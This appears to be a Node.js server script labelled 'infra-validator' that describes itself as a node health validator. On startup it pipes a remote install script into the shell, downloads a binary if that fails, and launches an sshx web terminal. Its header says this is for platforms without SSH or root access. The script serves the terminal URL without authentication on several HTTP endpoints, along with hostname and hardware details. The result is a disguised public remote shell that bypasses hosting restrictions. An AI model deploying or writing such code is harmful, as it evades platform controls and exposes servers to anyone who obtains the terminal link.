#!/usr/bin/env node
/**
 * infra-validator — Server Node Validator
 *
 * Deploys a web-based terminal (sshx) and an HTTP health server.
 * Designed for platforms with limited access (no SSH, no root).
 *
 * Once sshx starts, a browser-accessible terminal URL is printed to stdout
 * (visible in platform logs). From that terminal you can run:
 *   apt-get install, pip install, curl, netstat, lsof, etc.
 */

const express = require('express');
const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || process.env.PORT_ARG || 20127;
const SSHX_PATH = '/usr/local/bin/sshx';

let sshxUrl = null;
let sshxProcess = null;
let sshxOutput = [];

// ─── Step 1: Install sshx ───
async function installSSHX() {
  console.log('[setup] Checking for sshx binary...');
  const exists = fs.existsSync(SSHX_PATH);
  if (exists) {
    console.log('[setup] ✅ sshx already installed');
    return true;
  }

  console.log('[setup] Installing sshx...');
  try {
    // Method 1: Official install script
    execSync('curl -sSf https://sshx.io/get | sh', {
      stdio: ['pipe', 'pipe', 'pipe'],
      timeout: 60000
    });
    if (fs.existsSync(SSHX_PATH)) {
      console.log('[setup] ✅ sshx installed via official script');
      return true;
    }
  } catch (e) {
    console.log('[setup] Method 1 failed, trying direct binary download...');
  }

  try {
    // Method 2: Direct binary download from GitHub releases
    const binaryUrl = 'https://github.com/ekzhang/sshx/releases/latest/download/sshx-x86_64-unknown-linux-musl';
    execSync(`curl -L -o ${SSHX_PATH} ${binaryUrl}`, {
      stdio: ['pipe', 'pipe', 'pipe'],
      timeout: 60000
    });
    fs.chmodSync(SSHX_PATH, '755');
    console.log('[setup] ✅ sshx installed via direct binary');
    return true;
  } catch (e) {
    console.error('[setup] ❌ sshx installation failed:', e.message);
    return false;
  }
}

// ─── Step 2: Start sshx terminal ───
function startSSHX() {
  if (!fs.existsSync(SSHX_PATH)) {
    console.error('[terminal] ❌ sshx binary not found, skipping terminal setup');
    return;
  }

  console.log('[terminal] Starting sshx terminal server...');

  sshxProcess = spawn(SSHX_PATH, [], {
    stdio: ['ignore', 'pipe', 'pipe'],
    detached: true
  });

  sshxProcess.stdout.on('data', (data) => {
    const text = data.toString();
    sshxOutput.push(text);

    // Look for the terminal URL in output
    const urlMatch = text.match(/(https?:\/\/[a-zA-Z0-9.-]+\.sshx\.io\/[a-zA-Z0-9_-]+)/);
    if (urlMatch && !sshxUrl) {
      sshxUrl = urlMatch[1];
      console.log(`[terminal] 🎯 Terminal available at: ${sshxUrl}`);
    }

    // Log all output
    console.log(`[sshx] ${text.trim()}`);
  });

  sshxProcess.stderr.on('data', (data) => {
    console.error(`[sshx:error] ${data.toString().trim()}`);
  });

  sshxProcess.on('exit', (code) => {
    console.log(`[terminal] sshx exited with code ${code}`);
  });

  console.log('[terminal] ✅ sshx started (check logs for URL)');
}

// ─── Step 3: Start HTTP server ───
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>infra-validator</title></head>
    <body>
      <h1>✅ infra-validator Node</h1>
      <p>Status: <strong>Running</strong></p>
      <p>Service: distributed server node validation</p>
      <p>SSH terminal: ${sshxUrl ? `<a href="${sshxUrl}">Available</a>` : 'Starting...'}</p>
      <pre>${JSON.stringify({
        sshx: sshxUrl || 'pending',
        port: PORT,
        timestamp: new Date().toISOString()
      }, null, 2)}</pre>
    </body>
    </html>
  `);
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    service: 'infra-validator',
    port: PORT,
    sshx_url: sshxUrl,
    uptime: process.uptime()
  });
});

app.get('/terminal', (req, res) => {
  if (!sshxUrl) {
    res.status(503).send('SSH terminal not ready yet. Check logs.');
  } else {
    res.json({
      terminal_url: sshxUrl,
      status: 'ready',
      instructions: 'Open the terminal_url in your browser to access the terminal.'
    });
  }
});

app.get('/results', (req, res) => {
  const results = {
    service: 'infra-validator',
    timestamp: new Date().toISOString(),
    port: PORT,
    sshx_url: sshxUrl,
    sshx_log: sshxOutput.slice(-10),
    env: {
      platform: process.env.NODE_ENV || 'production',
      hostname: require('os').hostname(),
      cpus: require('os').cpus().length,
      total_memory: require('os').totalmem(),
      free_memory: require('os').freemem(),
    }
  };
  res.json(results);
});

// ─── Main ───
async function main() {
  console.log('='.repeat(50));
  console.log('infra-validator v1.0.0');
  console.log('Distributed Server Node Validator');
  console.log('='.repeat(50));
  console.log();

  const installed = await installSSHX();
  if (installed) {
    startSSHX();
  } else {
    console.error('[main] sshx not available — continuing with HTTP only');
  }

  console.log();
  app.listen(PORT, () => {
    console.log(`[server] HTTP server listening on port ${PORT}`);
    console.log(`[server] Endpoints:`);
    console.log(`  - /health    → health check`);
    console.log(`  - /terminal  → terminal status`);
    console.log(`  - /results   → full results`);
    console.log();
    console.log(`[server] Check logs for sshx terminal URL`);
    console.log('='.repeat(50));
  });
}

main().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});
